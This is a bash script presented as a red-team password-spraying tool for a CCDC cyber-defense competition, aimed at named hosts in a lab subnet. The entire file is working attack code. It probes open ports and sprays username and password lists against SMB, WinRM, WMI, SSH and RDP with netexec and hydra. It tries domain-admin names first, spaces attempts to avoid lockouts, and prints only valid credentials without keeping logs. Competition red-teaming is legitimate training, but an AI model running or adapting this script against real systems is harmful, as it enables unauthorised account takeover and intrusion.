#!/bin/bash
# ================================================
# CCDC Red Team Password Spray Script
# Targets: 192.168.20<TEAM>.{140,10,11,70,71,141,72}
# Uses: users.txt + passwords.txt (spray style = 1 pass → all users)
# Protocols: SMB → WinRM → WMI (netexec) | SSH → RDP (hydra)
# Pre-checks port availability, skips closed services
# Only prints successful creds — no log files
#
# Default: stop at first successful auth on any box/protocol/user
# -a flag : continue spraying everything after hits (full coverage)
# DA accounts are tried first before users.txt entries
# ================================================

set -euo pipefail

usage() {
  echo "Usage: $0 <team_number> [-a] [-u user1] [-u user2] ..."
  echo "  -a        continue-on-success: keep spraying after first hit"
  echo "  -u USER   add USER to the front of the spray list (repeatable)"
  exit 1
}

CONTINUE_ALL=0
EXTRA_USERS=()

if [[ $# -lt 1 ]]; then usage; fi
TEAM="$1"; shift

while getopts "au:" opt; do
  case "$opt" in
    a) CONTINUE_ALL=1 ;;
    u) EXTRA_USERS+=("$OPTARG") ;;
    *) usage ;;
  esac
done

BASE="192.168.20${TEAM}."
IPS=(
  "${BASE}140"  # curiosity
  "${BASE}10"   # morality
  "${BASE}11"   # intelligence
  "${BASE}70"   # anger
  "${BASE}71"   # fact
  "${BASE}141"  # space
  "${BASE}72"   # adventure
)

USERS_FILE="users.txt"
PASSES="passwords.txt"
DOMAIN="aperturesciencelabs.org"
TIMEOUT=2    # seconds for port check
GOT_ACCESS=0
DONE=0       # set to 1 on first hit when CONTINUE_ALL=0

# ============== BUILD USER LIST (explicit → DA → users.txt) ==============
DA_USERS=(Administrator caroline cave chell glados wheatley)
ALL_USERS=()

# Explicitly supplied -u users go first
for u in "${EXTRA_USERS[@]}"; do
  ALL_USERS+=("$u")
done

# DA accounts next (skip if already added via -u)
for u in "${DA_USERS[@]}"; do
  already=0
  for existing in "${ALL_USERS[@]}"; do
    [[ "${existing,,}" == "${u,,}" ]] && { already=1; break; }
  done
  [[ $already -eq 0 ]] && ALL_USERS+=("$u")
done

if [[ -f "$USERS_FILE" ]]; then
  while IFS= read -r u || [[ -n "$u" ]]; do
    [[ -z "$u" ]] && continue
    already=0
    for da in "${DA_USERS[@]}"; do
      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
    done
    [[ $already -eq 0 ]] && ALL_USERS+=("$u")
  done < "$USERS_FILE"
fi

# Check files exist
if [[ ! -f "$PASSES" ]]; then
  echo "[-] ERROR: passwords.txt not found in current directory!"
  exit 1
fi

if [[ ${#ALL_USERS[@]} -eq 0 ]]; then
  echo "[-] ERROR: no users loaded (users.txt missing or empty and DA list is empty)"
  exit 1
fi

# Check tools
if ! command -v netexec >/dev/null 2>&1; then
  echo "[-] ERROR: netexec not found! Install with: pipx install netexec"
  exit 1
fi
HAVE_HYDRA=0
command -v hydra >/dev/null 2>&1 && HAVE_HYDRA=1

# ============== PORT CHECK ==============
port_open() {
  local ip="$1" port="$2"
  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
}

proto_port() {
  case "$1" in
    smb)   echo 445 ;;
    winrm) echo 5985 ;;
    wmi)   echo 135 ;;
    ssh)   echo 22 ;;
    rdp)   echo 3389 ;;
  esac
}

# ============== PRE-SCAN ==============
declare -A LIVE_TARGETS

prescan() {
  local proto="$1"
  local port live=()
  port=$(proto_port "$proto")
  for ip in "${IPS[@]}"; do
    port_open "$ip" "$port" && live+=("$ip")
  done
  LIVE_TARGETS["$proto"]="${live[*]:-}"
}

echo "[*] Pre-scanning ports on ${#IPS[@]} targets..."
for proto in smb winrm wmi ssh rdp; do
  prescan "$proto"
  count=$(echo "${LIVE_TARGETS[$proto]}" | wc -w)
  port=$(proto_port "$proto")
  if [[ "$count" -gt 0 ]]; then
    echo "  [+] ${proto^^} (port ${port}): ${count} host(s) alive"
  else
    echo "  [-] ${proto^^} (port ${port}): no hosts — will skip"
  fi
done

echo "[*] Users: ${#ALL_USERS[@]} (${#EXTRA_USERS[@]} explicit + ${#DA_USERS[@]} DA + $((${#ALL_USERS[@]}-${#DA_USERS[@]}-${#EXTRA_USERS[@]})) from users.txt)"
[[ $CONTINUE_ALL -eq 1 ]] && echo "[*] Mode: continue-on-success (full spray)" || echo "[*] Mode: stop-on-first-hit"
echo "[*] Starting spray for TEAM ${TEAM} at $(date)"
echo ""

# ============== HIT HANDLER ==============
record_hit() {
  local result="$1"
  echo "$result"
  GOT_ACCESS=1
  [[ $CONTINUE_ALL -eq 0 ]] && DONE=1
}

# ============== SINGLE-ATTEMPT HELPERS ==============
# Returns 0 and calls record_hit if successful, 1 otherwise.

try_nxc() {
  local proto="$1" ip="$2" user="$3" pass="$4"
  local result
  result=$(netexec "$proto" "$ip" \
    -u "$user" -p "$pass" -d "$DOMAIN" \
    2>/dev/null | grep -i '\[+\]' || true)
  if [[ -n "$result" ]]; then
    record_hit "$result"
    return 0
  fi
  return 1
}

try_hydra() {
  local proto="$1" ip="$2" user="$3" pass="$4"
  local result
  result=$(hydra -l "$user" -p "$pass" -t 4 -W 2 "${proto}://${ip}" 2>/dev/null \
    | grep -i 'login:' || true)
  if [[ -n "$result" ]]; then
    record_hit "$result"
    return 0
  fi
  return 1
}

# ============== MAIN SPRAY LOOP ==============
# Order per password: SMB → WinRM → WMI → SSH → RDP
# Inner order: DA users first, then users.txt remainder
# Breaks out immediately on first hit unless -a is set.

while IFS= read -r pass || [[ -n "$pass" ]]; do
  [[ -z "$pass" ]] && continue
  [[ $DONE -eq 1 ]] && break

  # ---- netexec protocols ----
  for proto in smb winrm wmi; do
    [[ $DONE -eq 1 ]] && break
    targets="${LIVE_TARGETS[$proto]:-}"
    [[ -z "$targets" ]] && continue

    for ip in $targets; do
      [[ $DONE -eq 1 ]] && break
      for user in "${ALL_USERS[@]}"; do
        [[ $DONE -eq 1 ]] && break
        try_nxc "$proto" "$ip" "$user" "$pass" || true
      done
    done
  done

  # ---- hydra protocols ----
  if [[ $HAVE_HYDRA -eq 0 ]]; then
    [[ $GOT_ACCESS -eq 0 && $DONE -eq 0 ]] && true  # silently skip
  else
    for proto in ssh rdp; do
      [[ $DONE -eq 1 ]] && break
      targets="${LIVE_TARGETS[$proto]:-}"
      [[ -z "$targets" ]] && continue

      for ip in $targets; do
        [[ $DONE -eq 1 ]] && break
        for user in "${ALL_USERS[@]}"; do
          [[ $DONE -eq 1 ]] && break
          try_hydra "$proto" "$ip" "$user" "$pass" || true
        done
      done
    done
  fi

  [[ $DONE -eq 1 ]] && break
  # Delay between passwords to avoid lockouts
  sleep 3
done < "$PASSES"

echo ""
if [[ "$GOT_ACCESS" -eq 0 ]]; then
  echo "[-] access denied — no credentials worked"
else
  echo "[*] Spray complete — see hits above."
fi